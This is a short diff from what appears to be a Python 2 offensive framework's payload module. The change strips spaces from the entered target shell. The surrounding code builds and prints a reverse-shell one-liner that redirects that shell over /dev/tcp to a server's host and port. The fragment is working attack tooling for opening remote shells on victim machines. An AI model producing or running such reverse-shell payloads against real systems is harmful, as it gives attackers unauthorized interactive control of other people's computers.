@@ -26,7 +26,7 @@ class payload:
 		self.usage = "Run in terminal."
 
 	def run(self,server):
-		shell = raw_input(h.info_general_raw("Target Shell: "))
+		shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
 		payload = shell+" &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"
 		backend = len(payload)
 		print h.WHITE + "-"*backend + h.ENDC
